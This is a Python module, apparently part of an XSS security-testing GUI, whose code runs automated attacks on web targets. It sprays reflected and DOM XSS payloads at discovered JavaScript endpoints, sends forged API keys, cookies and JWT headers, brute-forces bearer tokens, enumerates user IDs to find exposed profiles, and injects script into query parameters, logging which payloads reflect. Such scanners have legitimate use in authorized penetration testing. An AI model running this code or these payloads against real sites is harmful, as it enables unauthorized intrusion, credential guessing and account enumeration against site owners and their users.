# xss_security_gui/auto_modules/dom_and_endpoints.py


import time
import requests
from urllib.parse import urljoin

# === Атака по найденным JS-эндпоинтам ===
def attack_found_targets(engine, scripts, payloads=None, methods=None):
    payloads = payloads or [
        "<img src=x onerror=alert(1)>",
        "\"'><script>alert(1)</script>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>"
    ]
    methods = methods or ["GET", "POST", "PUT", "DELETE"]

    engine._log("🔍 Запуск атак по найденным JS-эндпоинтам...")

    for script in scripts:
        if not isinstance(script, dict):
            engine._log(f"⚠️ Пропущен некорректный JS-объект: {script}", level="warn")
            continue

        fetches = (script.get("fetch_calls") or []) + (script.get("ajax_calls") or [])
        for endpoint in fetches:
            if not endpoint:
                continue
            if not str(endpoint).startswith("http"):
                endpoint = urljoin(engine.domain, endpoint)

            for method in methods:
                for payload in payloads:
                    r, elapsed = engine._make_request(method, endpoint, payload)
                    if isinstance(r, Exception) or r is None:
                        engine._record_result("endpoint_attack", {
                            "endpoint": endpoint,
                            "method": method,
                            "payload": payload,
                            "error": str(r),
                            "severity": "error"
                        })
                        continue

                    text_sample = r.text[:20000] if r.text else ""
                    reflected = payload in text_sample
                    severity = "high" if reflected else "low"

                    result = {
                        "endpoint": endpoint,
                        "method": method,
                        "payload": payload,
                        "status": r.status_code,
                        "elapsed_ms": elapsed,
                        "reflected": reflected,
                        "response_size": len(r.content) if r.content else 0,
                        "severity": severity
                    }
                    engine._record_result("endpoint_attack", result)


# === DOM-вектора ===
def attack_dom_vectors(engine, scripts, dom_payloads=None):
    dom_payloads = dom_payloads or {
        "setTimeout": f"{engine.domain}#alert(1)",
        "setInterval": f"{engine.domain}#alert(1)",
        "window.name": "javascript:window.name='<img src=x onerror=alert(1)>'",
        "location.hash": f"{engine.domain}#<img src=x onerror=alert(1)>",
        "postMessage": "window.postMessage('alert(1)', '*');"
    }

    engine._log("🚀 DOM атака началась...")

    for script in scripts:
        sensitive = script.get("xss_sensitive", []) or []
        for vector in sensitive:
            payload_url = dom_payloads.get(vector)
            if not payload_url:
                continue

            try:
                start = time.time()
                r = requests.get(payload_url, timeout=5)
                elapsed = (time.time() - start) * 1000.0
                reflected = "alert(1)" in (r.text[:20000] if r.text else "")
                severity = "high" if reflected else "low"

                result = {
                    "vector": vector,
                    "url": payload_url,
                    "status": r.status_code,
                    "elapsed_ms": elapsed,
                    "reflected": reflected,
                    "severity": severity
                }
                engine._record_result("dom_vector_attack", result)

            except Exception as e:
                engine._record_result("dom_vector_attack", {
                    "vector": vector,
                    "url": payload_url,
                    "error": str(e),
                    "severity": "error"
                })


# === Генератор заголовков ===
def build_headers_list(tokens):
    headers_set = [
        {},
        {"X-API-Key": "XSS-KEY"},
        {"Authorization": "Bearer XSS-Token"},
        {"Cookie": "session=XSSSESSION"},
        {"Cookie": "auth=XSSAUTH"},
        {"Cookie": "jwt=XSS-JWT"},
    ]

    for token in tokens:
        if isinstance(token, dict):
            name = token.get("name") or token.get("header") or "X-Token"
            value = token.get("value") or "XSS-Test"
            headers_set.append({name: value})
        elif isinstance(token, str):
            headers_set.append({token: "XSS-Test"})

    return headers_set


# === Нові модулі ===

def attack_api_endpoints(engine, session, base_url, endpoints, headers_list, log_func):
    log_func("🔷 API Endpoint Attacks...")
    for ep in endpoints:
        for headers in headers_list:
            try:
                r = session.get(urljoin(base_url, ep), headers=headers, timeout=5)
                severity = "high" if r.status_code == 200 and "alert" in r.text else "low"
                engine._record_result("api_attack", {
                    "endpoint": ep,
                    "status": r.status_code,
                    "headers": headers,
                    "severity": severity
                })
            except Exception as e:
                engine._record_result("api_attack", {
                    "endpoint": ep,
                    "error": str(e),
                    "severity": "error"
                })


def brute_force_tokens(engine, session, base_url, token_candidates, log_func):
    log_func("🔷 Token Brute Force...")
    for token in token_candidates:
        try:
            r = session.get(base_url, headers={"Authorization": f"Bearer {token}"}, timeout=5)
            severity = "high" if r.status_code == 200 else "low"
            engine._record_result("token_attack", {
                "token": token,
                "status": r.status_code,
                "severity": severity
            })
        except Exception as e:
            engine._record_result("token_attack", {
                "token": token,
                "error": str(e),
                "severity": "error"
            })


def attack_parameters(engine, session, base_url, parameters, log_func):
    log_func("🔷 Parameter Attacks...")
    for param in parameters:
        try:
            r = session.get(base_url, params={param: "<script>alert(1)</script>"}, timeout=5)
            reflected = "<script>alert(1)</script>" in r.text
            severity = "high" if reflected else "low"
            engine._record_result("param_attack", {
                "param": param,
                "status": r.status_code,
                "reflected": reflected,
                "severity": severity
            })
        except Exception as e:
            engine._record_result("param_attack", {
                "param": param,
                "error": str(e),
                "severity": "error"
            })


def attack_user_ids(engine, session, base_url, user_ids, log_func):
    log_func("🔷 User ID Attacks...")
    for uid in user_ids:
        try:
            r = session.get(f"{base_url}/user/{uid}", timeout=5)
            severity = "high" if r.status_code == 200 and "profile" in r.text.lower() else "low"
            engine._record_result("user_attack", {
                "user_id": uid,
                "status": r.status_code,
                "severity": severity
            })
        except Exception as e:
            engine._record_result("user_attack", {
                "user_id": uid,
                "error": str(e),
                "severity": "error"
            })


def attack_xss_targets(engine, session, base_url, xss_targets, log_func):
    log_func("🔷 XSS Target Attacks...")
    for target in xss_targets:
        try:
            r = session.get(urljoin(base_url, target), params={"q": "<img src=x onerror=alert(1)>"}, timeout=5)
            reflected = "<img src=x onerror=alert(1)>" in r.text
            severity = "high" if reflected else "low"
            engine._record_result("xss_target_attack", {
                "target": target,
                "status": r.status_code,
                "reflected": reflected,
                "severity": severity
            })
        except Exception as e:
            engine._record_result("xss_target_attack", {
                "target": target,
                "error": str(e),
                "severity": "error"
            })